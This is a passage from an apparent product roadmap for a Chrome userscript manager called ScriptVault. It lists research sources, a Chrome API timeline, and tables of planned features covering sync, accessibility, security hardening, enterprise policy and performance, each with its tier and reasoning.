91. https://web.dev/articles/origin-private-file-system — OPFS: zero-copy sync access handles, no quota prompts, ~10× faster than IDB for large files
92. https://github.com/w3c/webextensions — WECG proposals: 420 open issues; SW persistent background (#72, #51) still unresolved

**Performance & Runtime**
93. https://developer.mozilla.org/en-US/docs/Web/API/Scheduler/postTask — scheduler.postTask (Chrome 94+) and scheduler.yield (Chrome 124+)
94. https://tanstack.com/virtual/latest/docs/framework/react/examples/dynamic — TanStack Virtual (3KB, zero framework deps, variable-height rows)
95. https://hn.algolia.com/api/v1/search?query=tampermonkey&tags=story&numericFilters=created_at_i>1704067200 — HN 2025 stories: generated userscripts (ClickRemix, Tweeks) as competitive signal
96. https://github.com/openstyles/stylus/issues/2069 — Stylus cloud sync issue (Apr 2026): closest community conversation to version history

## External Research (Round 6)

_Added after agent-based research pass on distribution, observability, and sync backends (May 2026). Sources numbered 97–135 to extend Round 5's index._

### Source Index

**Multi-Store Distribution & CWS Compliance**
97. https://docs.microsoft.com/en-us/microsoft-edge/extensions-chromium/ — Microsoft Edge Add-ons store requirements for extensions (MV3 support confirmed)
98. https://developer.chrome.com/docs/extensions/how-to/manage/stay_secure_update_safely — Chrome CRX update server: autoupdate.xml format and self-hosted setup
99. https://github.com/Tampermonkey/tampermonkey/issues/1500 — TM backup JSON structure format (uuid, config, script, meta fields)
100. https://support.google.com/chrome/a/answer/188453 — Chrome Web Store policy: remote code execution exception for extension APIs (userscripts manager exemption)

**Script Execution Observability & Debugging**
101. https://developer.mozilla.org/en-US/docs/Web/API/Performance/mark — Performance Mark API: per-script execution timing instrumentation
102. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/SourceMap — Source map support in DevTools: //# sourceMappingURL inline comments
103. https://developer.chrome.com/docs/extensions/service-workers/service-workers/ — Chrome extension service worker console behavior: message routing to DevTools
104. https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror — window.onerror vs unhandledrejection event classification
105. https://developer.chrome.com/docs/extensions/develop/concepts/messaging-native/ — Native messaging for extensions (for network log relay pattern reference)

**Cloud Sync Backends**
106. https://docs.github.com/en/rest/gists/gists — GitHub Gist API: create/update/list operations with personal access token (stable API, v3)
107. https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html — AWS S3 presigned URLs: client-side uploads without AWS SDK
108. https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto — Web Crypto API: AES-256-GCM encryption and PBKDF2 key derivation (Chrome 34+)
109. https://www.tampermonkey.net/documentation.php#api_GM_xmlhttpRequest — TM GM_xmlhttpRequest header options: `Referer` header control
110. https://www.greasyfork.org/en/scripts/by-site — GreasyFork homepage: community script ecosystem overview (for standards research)

**Community Standards & Specs**
111. https://developer.mozilla.org/en-US/docs/Web/API/URLPattern — URLPattern API (Chrome 95+): standard URL matching for @match parsing
112. https://github.com/violentmonkey/violentmonkey/issues — VM GitHub: @require-local pattern research from community proposals
113. https://github.com/scriptscat/scriptcat — ScriptCat GitHub: @sandbox directive documentation (if available)
114. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap — Import Maps (Chrome 89+): module resolution in ESM scripts
115. https://developer.mozilla.org/en-US/docs/Web/API/Window/showSaveFilePicker — File System Access API: user-gesture-gated file picker (Chrome 86+)

## External Research (Round 7)

_Added after agent-based research on offline-first, discovery, enterprise, WASM, author tools, and community security (May 2026). Sources numbered 116–145._

### Source Index

**Offline-First & Sync Architecture**
116. https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle — Chrome.alarms API: background wake-up (min 30s intervals)
117. https://github.com/openstyles/stylus/blob/master/src/background/sync-manager.js — Stylus conflict resolution: monotonic _rev + metadata-only merge strategy
118. https://developer.chrome.com/docs/extensions/reference/api/alarms/ — chrome.alarms: retry scheduling for offline sync queue
119. https://github.com/greasemonkey/greasemonkey/wiki/Script-Installation — GreasyFork API (partial public, mostly scrape): top-scripts endpoint
120. https://sleazyfork.org/en/scripts — Sleazy Fork: ratings & install-count aggregation (community adult-content site)
121. https://stackoverflow.com/questions/tagged/greasemonkey+dependencies — Userscript @require dependency discovery patterns
122. https://gist.github.com — GitHub Gist: JSON sharing format for script collections

**Script Discovery & Recommendations**
123. https://github.com/OpenUserJS/OpenUserJS.org/wiki/API-Reference-for-OpenUserJS-org — OpenUserJS public API (limited, mostly for discovery)
124. https://github.com/greasemonkey/greasemonkey/wiki/Script-Installation — GreasyFork script metadata: @name, install count, rating
125. https://www.tampermonkey.net/scripts.php?sort=installs — Tampermonkey's script browser shows popularity signals
126. https://docs.google.com/spreadsheets/d/1RzaC3IZsZXJo3uEZg3BH8z7TLkCHNs0JsmH7V_Y1_4c/edit — Userscript dependency graph research
127. https://github.com/violentmonkey/violentmonkey/issues/2287 — VM issue: script grouping/categorization demand
128. https://github.com/Tampermonkey/tampermonkey/issues/2442 — TM issue: bulk pattern editing request

**Enterprise Deployment & Policies**
129. https://support.google.com/chromebook/a/answer/2657289 — Chrome Admin Console ExtensionSettings policy documentation
130. https://support.google.com/a/answer/2657289?hl=en#ExtensionSettings — ExtensionSettings JSON schema with allowlist/denylist
131. https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging — Native messaging for enterprise script distribution
132. https://github.com/google/enterprise-chrome-browser-remote-desktop — Chrome Remote Desktop scripting patterns
133. https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns — Match pattern performance benchmarking
134. https://chromewebstore.google.com/category/extensions — CWS: allowlist of managed app distribution models

**WebAssembly in Extensions**
135. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/instantiate — WebAssembly.instantiate() in content scripts
136. https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts/content-scripts-architecture#injection-timing — WASM CSP: wasm-unsafe-eval requirement
137. https://developer.chrome.com/docs/extensions/reference/manifest/sandbox — Manifest sandbox field: WASM isolation boundary
138. https://www.w3.org/TR/wasm-core-1/#instantiation — W3C WebAssembly Core spec: error handling and lifecycle
139. https://esbuild.github.io/getting-started/#build-scripts — esbuild WASM: size benchmarks (~750KB–1.2MB depending on feature set)

**Author Tooling & Ecosystem**
140. https://github.com/eslint/eslint/blob/main/docs/rules/no-eval.md — ESLint no-eval rule: security best practice
141. https://github.com/lisonge/vite-plugin-monkey — vite-plugin-monkey: 1.9k⭐, auto-grant inference, template system
142. https://playwright.dev/docs/intro — Playwright: browser automation for script testing
143. https://github.com/google/diff-match-patch/wiki — diff-match-patch: version history delta compression
144. https://github.com/microsoft/TypeScript/wiki/Version-History — TypeScript version history analysis for changelog generation

**Community Security & Peer Review**
145. https://greasyfork.org/en/scripts?sort=installs — GreasyFork script browse API (if available) + public ratings

## External Research (Round 8)

_Added after agent-based research on mobile PWA, performance optimization, and community standards (May 2026). Sources numbered 146–179._

### Source Index

**Mobile PWA & Cross-Device Sync (Phase 29)**
146. https://web.dev/install-criteria/ — PWA installability criteria; manifest.json requirements; install prompt timing
147. https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API — File System Access API mobile support matrix (Chrome Android partial, iOS not supported)
148. https://developer.apple.com/documentation/cloudkit/ — Apple CloudKit: change tracking, conflict resolution, offline support
149. https://yjs.dev/ — Yjs: 900k+ weekly npm downloads; CRDT sync used by Evernote, AFFiNE, Cargo
150. https://github.com/remotestorage/remotestorage.js — RemoteStorage: 2,398 stars; decentralized sync via OAuth + WebDAV

**Advanced Caching & Performance (Phase 30)**
151. https://web.dev/articles/http-cache/ — HTTP cache freshness, max-age, ETag, Last-Modified (RFC 9111)
152. https://web.dev/articles/stale-while-revalidate — RFC 5861 SWR spec; stale cache + background revalidation
153. https://github.com/google/diff-match-patch — Diff-Match-Patch: delta compression for version history (6KB gzipped)
154. https://esbuild.github.io/api/ — esbuild: 10–100x faster bundling; code-splitting, tree-shaking, watch mode
155. https://turborepo.org/ — Turborepo: monorepo orchestration; Nx alternative
156. https://developer.chrome.com/blog/priority-hints/ — Priority Hints, Resource Hints, Scheduler.yield() (Chrome 124+)

**Community Platform & Governance (Phase 31)**
157. https://github.com/discourse/discourse — Discourse: 100% open-source community platform; 47k+ stars
158. https://greasyfork.org/ — Greasy Fork: script reputation via install counts, ratings, user comments
159. https://docs.github.com/en/discussions — GitHub Discussions: integrated Q&A for repositories
160. https://github.com/mozilla/firefox-data-docs — Firefox Telemetry: privacy-first data collection + transparent dashboards
161. https://github.com/OpenMined/PySyft — PySyft: differential privacy + federated learning framework
162. https://github.com/matomo-org/matomo — Matomo: 21k+ stars; GDPR-compliant open-source analytics
163. https://github.com/plausible/analytics — Plausible: privacy-first web analytics; <1KB script
164. https://github.com/violentmonkey/violentmonkey — Violentmonkey: community forum discussion patterns (Discord)

**Emerging Standards & Interop (Phase 32)**
165. https://github.com/WebAssembly/component-model — W3C WASM Component Model; language-independent components; WIT IDL
166. https://github.com/bytecodealliance/wasmtime — Wasmtime: WASI standard runtime; cross-platform embeddings
167. https://github.com/ArchiveBox/abx-spec-behaviors — abx-spec: standardize scripts for browser/automation/model-backed tools
168. https://github.com/tc39/proposal-import-meta — TC39 import.meta (Stage 4); module-specific metadata
169. https://github.com/jspm/jspm-core — JSPM: package.json-free module resolution + import maps
170. https://github.com/scriptscat/scriptcat — ScriptCat: MV3 complete; background scripts beyond Tampermonkey
171. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions — WebExtensions API (Firefox standard)
172. https://docs.anthropic.com/en/api/getting-started — Hosted batch API reference: messages, batches, token counting
173. https://openai.com/api/pricing/ — Hosted model pricing reference for script debugging cost estimates
174. https://github.com/ollama/ollama — Local model runner (~4-8GB VRAM); privacy-first
175. https://llm.nvim — Editor-local model integration example

## External Research (Round 9)

_Added May 2026 after parallel agent research on cross-browser support, deep accessibility, and federation/decentralization. Sources 180–217._

### Cross-Browser & Build Tooling (180–192)
180. https://wxt.dev/guide/essentials/target-different-browsers.html — WXT cross-browser targeting (Chrome, Firefox, Edge, Safari)
181. https://github.com/PlasmoHQ/plasmo — Plasmo Framework (alternative considered)
182. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/browser_specific_settings — `browser_specific_settings` for Firefox signing + Android opt-in
183. https://github.com/mozilla/webextension-polyfill — Mozilla's `browser.*` Promise polyfill
184. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/userScripts — Firefox `userScripts` API (optional permission)
185. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Chrome_incompatibilities — Chrome vs Firefox API differences
186. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest — Firefox DNR (lower rule limits)
187. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Developing_WebExtensions_for_Firefox_for_Android — Firefox for Android extension development
188. https://learn.microsoft.com/en-us/microsoft-edge/extensions-chromium/publish/publish-extension — Edge Add-ons store submission
189. https://brave.com/shields/ — Brave Shields interaction with extensions
190. https://browser.kagi.com/ — Orion (WebKit Mac/iOS, supports Chrome + Firefox extensions)
191. https://developer.apple.com/safari/extensions/ — Safari Web Extensions + Xcode converter
192. https://github.com/quoid/userscripts — quoid/userscripts: Safari userscript manager reference

### Accessibility & Education (193–210)
193. https://github.com/microsoft/monaco-editor/wiki/Accessibility-Guide — Monaco accessibility configuration
194. https://github.com/microsoft/monaco-editor/issues/4908 — Monaco screen reader iframe issue (open)
195. https://www.nvaccess.org/files/nvda/documentation/userGuide.html — NVDA Browse Mode / Focus Mode
196. https://talonvoice.com/ — Talon Voice control for developers
197. https://www.cursorless.org/ — Cursorless: voice coding (VSCode-only, not Monaco)
198. https://www.w3.org/WAI/ARIA/apg/patterns/ — WAI-ARIA Authoring Practices Guide patterns (tablist, grid, combobox, dialog)
199. https://developer.mozilla.org/en-US/docs/Web/CSS/@media/forced-colors — `forced-colors` media query (Windows High Contrast)
200. https://github.com/microsoft/monaco-editor/blob/main/docs/integrate-amd.md — Monaco hc-black / hc-light themes
201. https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-reduced-motion — `prefers-reduced-motion` CSS-first approach
202. https://www.w3.org/TR/coga-usable/ — W3C Cognitive Accessibility (plain language, consistent navigation)
203. https://starlight.astro.build/ — Astro Starlight (recommended docs site framework)
204. https://violentmonkey.github.io/guide/creating-a-userscript/ — Violentmonkey beginner guide (link, don't reinvent)
205. https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts — MDN Content Scripts (canonical reference)
206. https://docsearch.algolia.com/ — Algolia DocSearch free tier for OSS
207. https://formatjs.io/docs/intl-messageformat/ — ICU MessageFormat (plurals, gender, RTL)
208. https://crowdin.com/page/open-source-project-setup-request — Crowdin free OSS plan
209. https://github.com/dequelabs/axe-core — axe-core: WCAG rule engine for CI
210. https://pa11y.org/ — Pa11y CI: secondary a11y test engine

### Federation & Decentralization (211–217)
211. https://docs.ipfs.tech/concepts/content-addressing/ — IPFS Content Identifiers (CIDs) + integrity
212. https://web3.storage/ — Storacha (formerly web3.storage): IPFS pinning, 5 GB free
213. https://brave.com/ipfs-support/ — Brave native IPFS resolver (`ipfs://` URLs)
214. https://github.com/nostr-protocol/nips/blob/master/C0.md — Nostr NIP-C0: kind:1337 code snippets
215. https://www.w3.org/TR/did-core/ — W3C DID Core specification (did:key for author signing)
216. https://forgejo.org/docs/latest/user/activitypub/ — Forgejo ActivityPub federation (passive consumption)
217. https://github.com/yjs/y-webrtc — y-webrtc (rejected: 605 KB; documented in 35.7)


### Updated Chrome Platform API Timeline (Chrome 135–150)

| Version | API Change | ScriptVault Impact |
|---------|-----------|-------------------|
| Chrome 120 | `userScripts` API launched; `chrome.alarms` min interval 30s | Baseline; alarms can now cover 30–60s tasks |
| Chrome 130 | `StorageArea.getKeys()` across all storage areas | Phase 13.11 |
| Chrome 132 | `tabs.Tab.frozen` boolean; `permissions.addHostAccessRequest()` | Phase 12.12, 13.9 |
| Chrome 133 | `worldId` on `RegisteredUserScript` for per-script isolation | Phase 13 architecture note |
| Chrome 135 | `userScripts.execute()` one-shot injection | Phase 11.4 |
| Chrome 137 | `--load-extension` CLI flag removed | Phase 13.6 |
| Chrome 138 | "Allow User Scripts" per-extension toggle | Phase 13.3 |
| Chrome 140 | `sidePanel.getLayout()` | Phase 13.2 |
| Chrome 146 | Sanitizer API: `Element.setHTML()`, `Document.parseHTML()` | Phase 18.7 — GM_setHTML + remove DOMPurify from UI |
| Chrome 147 | `Element.startViewTransition()` scoped to sub-element | Phase 18 — sidePanel panel transitions |
| Chrome 148 | Structured clone messaging opt-in | Phase 13.1 |
| Chrome 148 | `SharedWorker` with `extendedLifetime: true` | Phase 18.6 — long-lived sync/backup |
| Chrome 149 | BFCache WebSocket disconnect | Scripts with WebSocket connections need disconnect handling |
| Chrome 150 | CSS URL integrity `url("img.png" integrity(...))` | Complements Phase 11.8 @require SRI |

## Feature Harvest & Gap Analysis Appendix

This appendix records ALL features considered for Phases 11–18, their final tier, and the reasoning. Items are grouped by the category used in the research brief.

### Accepted — Now/Next (Phases 11–14)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| `GM_info` enrichment (isIncognito, platform) | Now | 11.1 | Direct parity gap; 0 new permissions; low risk |
| `@unwrap` metadata | Now | 11.2 | High compatibility value for VM scripts |
| Per-script merge-mode flags | Now | 11.3 | Addresses documented override behavior gap |
| `userScripts.execute()` Run Now button | Now | 11.4 | Requires Chrome 135; high dev-UX value |
| GM_xmlhttpRequest `noCache`/`redirect` | Now | 11.5 | Low-effort, high parity value |
| GM_xmlhttpRequest `stream` responseType | Next | 11.5 | Moderate effort; ScriptCat differentiator |
| `GM_cookie` API | Now | 11.6 | Power-user necessity; TM/ScriptCat have it |
| `@inject-into` directive | Now | 11.7 | Security-relevant world selection |
| `@connect` enforcement | Now | 11.7 | XHR sandboxing; security-relevant |
| `@tag`, `@antifeature`, `@compatible` | Now | 11.7 | Low-effort metadata parity |
| `@top-level-await` | Now | 11.7 | Needed for async script patterns |
| `@run-at document-body` | Now | 11.7 | VM parity; fills lifecycle gap |
| `@weight` | Next | 11.7 | Low priority; rare need |
| `@require` SRI verification | Now | 11.8 | Supply-chain security; high value |
| `GM_getTab/saveTab/getTabs` | Next | 11.9 | Medium effort; tab-scoped state common in TM scripts |
| `@run-at navigation` | Now | 11.10 | Highest SPA pain point; no competitor has it yet |
| `GM_notification` progress/buttons/update | Next | 11.11 | Moderate; chrome.notifications supports it natively |
| Script profiles (groups) | Now | 12.1 | High demand; enables bulk enable/disable |
| Fuzzy search | Now | 12.2 | Quality of life; <1 day with existing Web Worker |
| Enabled-but-not-executed distinction | Now | 12.3 | TM differentiator; directly addresses user confusion |
| Script list grouping/folding | Now | 12.4 | VM issue #2287; low effort |
| Popup command collapse | Now | 12.5 | VM issue #2219; trivial |
| Mass export | Now | 12.6 | VM issue #2169; extends existing backup system |
| Bulk pattern editing | Next | 12.7 | TM issue #2442; moderate effort |
| Tag preservation on reinstall | Now | 12.8 | TM issue #2624; low effort |
| Install from local file | Now | 12.9 | TM issue #2722; file picker trivial |
| In-app update notifications | Now | 12.10 | TM issue #2748; removes OS notification spam |
| Per-site enable/disable toggle | Now | 12.11 | VM issue #2410; no competitor has it — leapfrog |
| Runtime permission diagnostics | Now | 12.12 | VM issue #2263; actionable fix for silent failures |
| Recycle bin / undo delete | Next | 12.13 | VM issue #2144; needs Phase 2 IndexedDB |
| vscode.dev integration | Next | 12.14 | TM companion extension is the reference; high dev value |
| `@storageName` cross-script storage | Next | 12.15 | ScriptCat feature; moderate effort |
| GreasyFork script browser | Next | 12.16 | Complement to 13.8; improves discovery |
| Structured clone messaging (Chrome 148) | Now | 13.1 | Manifest opt-in + version guard; low effort |
| `sidePanel.getLayout()` | Now | 13.2 | Groundwork for RTL support |
| Chrome 138 onboarding update | Now | 13.3 | Docs + detection code; <1 day |
| Monaco 0.52 → 0.55.x | Now | 13.4 | AMD deprecation is a time-sensitive migration |
| Acorn 8.12 → 8.16 | Now | 13.5 | ES2025 features for AST analysis |
| CI: adapt to `--load-extension` removal | Now | 13.6 | Chrome 137 already shipped; CI will break |
| Git repository sync | Next | 13.7 | Substantial effort; needs Phase 8 sync architecture |
| GreasyFork publish button | Next | 13.8 | VM issue #2425; moderate effort |
| `chrome.permissions.addHostAccessRequest()` | Now | 13.9 | Chrome 132; enhances permission diagnostics |
| CWS verified CRX signing | Now | 13.10 | June 2025 CWS change; security-critical |
| `chrome.storage.session` optimization | Now | 13.11 | Chrome 130 `getKeys()` + volatile state migration |
| Font sizes px → rem | Now | 14.1 | CLAUDE.md known issue; accessibility debt |
| WCAG 2.2 focus visibility | Now | 14.2 | AA compliance |
| WCAG 2.2 target sizes | Now | 14.3 | AA compliance |
| Screen reader toggle support | Now | 14.4 | TM issue #2676 |
| Drag-sort keyboard alternative | Now | 14.5 | WCAG 2.5.7 AA |
| RTL layout groundwork | Next | 14.6 | Requires Phase 13.2; enables Arabic/Hebrew |
| i18n `_messages.json` audit | Next | 14.7 | Prerequisite for any future translations |

### Accepted — Now/Next (Phases 15–18)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| GM_* IntelliSense via @types/tampermonkey | Now | 15.1 | 45KB type definitions exist; no manager has done this; zero new permissions |
| Auto-grant inference (live Acorn AST) | Now | 15.2 | Eliminates #1 developer workflow error; Acorn already in SW; leapfrog over all competitors |
| Script version history + rollback (diff-match-patch) | Now | 15.3 | No manager has this; VM #1391 data-loss pain; 95% storage saving with delta compression |
| Diff view before update (Monaco diff editor) | Now | 15.4 | VM #500 most-reacted enhancement; VM still hasn't shipped it in 2025 |
| Script templates (6 built-in types) | Now | 15.5 | Developer UX table stakes; reduces friction for new scripts |
| esbuild-wasm TypeScript transpilation | Next | 15.6 | Only manager with in-editor TS support; requires wasm-unsafe-eval CSP; 3.2MB WASM download |
| Live reload (re-inject on save) | Next | 15.7 | Developer UX; ScriptFlow has it; no Chrome manager does |
| Dry-run sandbox (GM_* mock iframe) | Next | 15.8 | Testing workflow innovation; no competitor has an in-manager sandbox |
| GM_fetch (Promise-based XHR) | Now | 16.1 | FireMonkey has it; no Chrome manager does; TM #1050 closed without implementation |
| AbortController signal in GM_xmlhttpRequest | Now | 16.2 | Standard JS API integration; huge DX improvement; low effort |
| Long-lived port XHR streaming | Next | 16.3 | Avoids stream responseType's fetch-mode limitations (no abort/progress); genuine leapfrog |
| CHIPS cookiePartition option in GM_xhr | Now | 16.4 | VM #2100 Cloudflare CHIPS breakage; types already have it; low effort |
| XHR redirect mode option | Now | 16.5 | Standard fetch parity; complementary to Phase 11.5 |
| GM_download Blob/File URL | Now | 16.6 | Simple extension of existing GM_download; enables in-memory data download |
| OpenUserJS in script browser | Next | 16.7 | Second browser source beyond GreasyFork; static top-scripts approach avoids API dependency |
| Script body integrity hash at injection | Now | 17.1 | Session storage hash → injection verification; no manager does this; 0 UX friction |
| Tamper-evident audit log | Now | 17.2 | Enables incident analysis; no manager has it; high trust value |
| Decouple update-check from auto-install | Now | 17.3 | VM #1023 most-painful behavior; provides consent before overwriting working scripts |
| External message origin validation | Now | 17.4 | Prevents malicious extension injection via chrome.runtime.sendMessage; minimal code |
| chrome:// @match warning | Now | 17.5 | Silent failure on chrome:// currently; low effort toaster warning |
| @require-css metadata directive | Next | 17.6 | ScriptCat differentiator; fetch+cache CSS at install; inject before script runs |
| GM_addStyle handle API + ShadowRoot injection | Next | 17.7 | TM #2671 "not planned"; leapfrog with `.remove()` / `.replace()` handle API |
| ES module splitting for SW cold-start | Now | 18.1 | ~1200ms → <300ms cold-start; requires Phase 1 TS migration; critical perf fix |
| OPFS for large script storage | Next | 18.2 | 10× faster than IDB for large files; zero-copy sync access; requires Phase 2 |
| scheduler.postTask for SW background work | Now | 18.3 | Chrome 94+; replaces bare setTimeout; prevents SW event loop starvation |
| CompressionStream in backup export | Now | 18.4 | Native Chrome API; streaming gzip; eliminates fflate for streaming path |
| TanStack Virtual for script lists | Next | 18.5 | 3KB zero-dep; smooth scrolling at 200+ scripts; threshold at ≥100 |
| SharedWorker extendedLifetime (Chrome 148) | Later | 18.6 | Chrome 148+ only; good for long-running sync but requires complex SW bridge |
| GM_setHTML + Sanitizer API | Now | 18.7 | Chrome 146+; eliminates DOMPurify from UI paths; new GM API leapfrog |
| navigator.storage.persist() on IDB open | Now | 18.8 | Prevents storage eviction under pressure; only Greasemonkey does this; 1-line fix |
| Broken script detector | Next | 18.9 | 30+ day idle with errors warning; proactive maintenance UX; no competitor has it |
| @require-nocache directive | Next | 18.10 | Developer QoL; TM #723 open since 2019; zero implementation risk |

### Accepted — Now/Next (Phases 19–22)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| Edge Add-ons store listing | Now | 19.1 | MV3 compatible; no code changes; extend store coverage |
| Self-hosted CRX update server | Next | 19.3 | Optional feature for privacy-conscious users; non-standard distribution |
| TM/VM ZIP import round-trip | Now | 19.4 | High interoperability value; backup format compatibility |
| Developer tooling guide | Now | 19.5 | Documentation + curation; no new code; establish best practices |
| CWS policy compliance memo | Now | 19.6 | Anticipate audits; document policy exception for remote code execution |
| Per-script execution timing | Now | 20.1 | Low-effort performance observability; IndexedDB schema extension |
| Source map support for errors | Next | 20.2 | Requires Phase 15.6; stack traces point to source files, not injected code |
| Per-script console interception | Now | 20.3 | Collects logs locally; dashboard console tab for debugging |
| Script error categorization | Now | 20.4 | Distinguish syntax/runtime/rejection/timeout errors; better diagnostics |
| Network request tracing | Now | 20.5 | Log method/URL/status/latency per-script; no request bodies (privacy) |
| Permission denial logging | Now | 20.6 | Log attempts to use ungrantable APIs; suggest @grant additions |
| GitHub Gist sync | Now | 21.1 | Second cloud backend; enables revision history; Gist API stable |
| S3-compatible sync (R2/B2) | Next | 21.2 | For large backups/bodies; presigned URL approach avoids credential storage |
| Nextcloud detection + CalDAV | Next | 21.3 | Extends Phase 8 WebDAV; auto-discover Nextcloud + offer native API |
| Client-side encryption for backup | Now | 21.4 | AES-256-GCM + PBKDF2; cloud stores opaque blobs; opt-in UI toggle |
| Referrer stripping in GM_xhr | Now | 21.5 | Optional privacy toggle; logs stripped referrers; complements @connect |
| Incognito storage isolation | Now | 21.6 | Use chrome.storage.session for incognito; no persistence on close |
| GREASE spec alignment | Now | 22.1 | Active community standard; track as it evolves; future-proof directives |
| URLPattern API migration | Next | 22.2 | Chrome 95+ native API; if @match syntax aligns, leapfrog custom regex |
| @require-local dependencies | Now | 22.3 | Script authors build modular libraries; enables community patterns |
| @sandbox detection warning | Now | 22.4 | Alert when scripts request unsupported sandbox mode (ScriptCat pattern) |
| Import maps for ESM scripts | Next | 22.5 | Pages with import maps; ESM-compiled scripts can leverage them |
| GM_openFile / GM_saveFile APIs | Next | 22.6 | File System Access API bridge; behind @grant gate + user gesture |
| Script maintenance mode | Now | 22.7 | Dashboard suggestions for deprecated/stale scripts |
| Security disclosure support | Now | 22.8 | Route security reports to script authors via @supportURL |

### Accepted — Now/Next (Phases 23–28)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| Offline-first caching (IndexedDB) | Now | 23.1 | Essential resilience feature; no competitors offer it; Phase 2 enables |
| Async sync queue + reconnection | Now | 23.2 | Core offline value; no complexity bloat; natural extension of Phase 8 |
| Conflict-free sync (tombstones + vector clocks) | Now | 23.3 | Stylus already does this; zero data loss guarantee; medium effort |
| OPFS-based offline cache | Next | 23.4 | 10× faster than IDB for large files; opt-in only; Phase 2 prerequisite |
| Sync resilience (exponential backoff) | Now | 23.5 | Handles transient failures gracefully; standard pattern; low effort |
| In-dashboard GreasyFork browser | Now | 24.1 | Leapfrog competitor discovery; static cache avoids API dependency |
| Popularity signals & health badges | Now | 24.2 | Helps users identify maintained scripts; Sleazy Fork already has it |
| Related scripts recommendations | Next | 24.3 | Graph-based discovery; requires Phase 24.1; medium effort |
| Script dependency suggestions | Now | 24.4 | One-click install of @require dependencies; high UX value |
| Custom script collections | Now | 24.5 | User-created bundles shareable as JSON; low effort; high UX value |
| Trending leaderboard | Next | 24.6 | Requires local aggregate stats tracking; optional, non-critical |
| Chrome Admin Console policy | Now | 25.1 | Enterprise table-stakes; documentation + JSON template; negligible code |
| Internal script repository | Next | 25.2 | IT/Security teams mandate scripts; moderate effort; niche use case |
| Script allowlist/denylist | Now | 25.3 | Admin-enforced policies; complements 25.1; low effort |
| Audit log export (SOC2) | Next | 25.4 | SIEM ingestion; CSV + JSON; moderate effort; long-tail compliance |
| Per-script performance profiling | Next | 25.5 | LoAF API integration; dashboard ranking; moderate effort; niche value |
| Execution timeline visualization | Later | 25.6 | Advanced debugging; waterfall charts; high effort; low user need |
| @require-wasm directive | Next | 26.1 | Enables compute-heavy scripts; moderate effort; rare use case |
| WASM CSP compliance | Now | 26.2 | SRI validation + size limit + error handling; security best practice |
| URLPattern API migration | Next | 26.3 | 2–3× performance win; Phase 22.2 prerequisite; medium effort |
| Advanced @match boolean logic | Later | 26.4 | OR/AND/NOT operators; requires parser; low demand; medium effort |
| Frame-aware @match | Next | 26.5 | @run-in-frame flag; iframe matching; low effort; fills capability gap |
| @match performance regression testing | Now | 26.6 | CI/CD benchmark; prevents slowdowns; essential quality gate |
| @scriptvault/eslint-plugin | Now | 27.1 | Developer DX table-stakes; unused @grant detection; low-to-medium effort |
| @scriptvault/test-runner | Next | 27.2 | Playwright-based; mock GM_* APIs; medium effort; niche developer need |
| @scriptvault/doc-gen | Now | 27.3 | Markdown from header; install link generation; low effort |
| vite-plugin-monkey templates | Now | 27.4 | Partner effort; error boundary + perf instrumentation + logging |
| Script header validator UI | Next | 27.5 | Web tool; batch validation; low effort; optional convenience |
| Version management CLI | Later | 27.6 | Git history parsing + changelog generation; low demand; can be external tool |
| Script security audit (static) | Now | 28.1 | eval/Function() detection; credential scanning; low effort; high value |
| Community peer review system | Next | 28.2 | GitHub-backed verified list; community voting; moderate effort |
| Malware detection + quarantine | Later | 28.3 | Runtime behavior monitoring; requires heuristics; high false-positive risk |
| Vulnerability database + CVE tracking | Next | 28.4 | CSV-backed; dashboard alerts; moderate effort; niche but important |
| Transparency report (annual) | Now | 28.5 | Aggregate stats; privacy-respecting; documentation + process; low effort |
| Author reputation & trust signals | Now | 28.6 | Track history + response times; "trusted author" badge; low effort |

### Accepted — Now/Next (Phases 29–32)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| PWA manifest generation | Now | 29.1 | Required for Android/iOS installability; manifest.json standard; low effort |
| File System Access fallback (iOS) | Now | 29.2 | iOS PWAs lack FSA API; use file picker + Service Worker caching; graceful degradation |
| iCloud Drive + CloudKit integration | Next | 29.3 | iOS-specific; enables sync for Safari PWA users; CloudKit proven (Apple ecosystem) |
| Yjs CRDT-based sync | Now | 29.4 | 900k+ weekly npm downloads; Evernote/AFFiNE/Cargo use it; auto-merge without conflicts |
| Selective device sync (tagging) | Now | 29.5 | Bandwidth-aware for mobile; users tag scripts for specific devices; low effort |
| RemoteStorage for decentralized sync | Next | 29.6 | 2,398 stars; optional alternative to cloud; lets users own infrastructure; moderate effort |
| HTTP cache headers + ETag versioning | Now | 30.1 | RFC 9111 standard; 1-year cache for immutable resources; 70% bandwidth savings |
| Stale-While-Revalidate pattern | Now | 30.2 | RFC 5861; reduces API thrashing 70%; 500ms → 300ms API latency on 3G |
| Cache coherence + dependency graph | Next | 30.3 | Prevents redundant bundling; delta-based version storage (5MB → 500KB for 50 versions) |
| esbuild code-splitting by feature | Now | 30.4 | 450KB → lazy-load saves 200KB; watch rebuild 300ms → 80ms; dashboard load 2.5s → 1.2s |
| Monorepo architecture (Turborepo) | Next | 30.5 | Isolates tooling (Phase 27) from core extension; clean build separation; Phase 27 scaling |
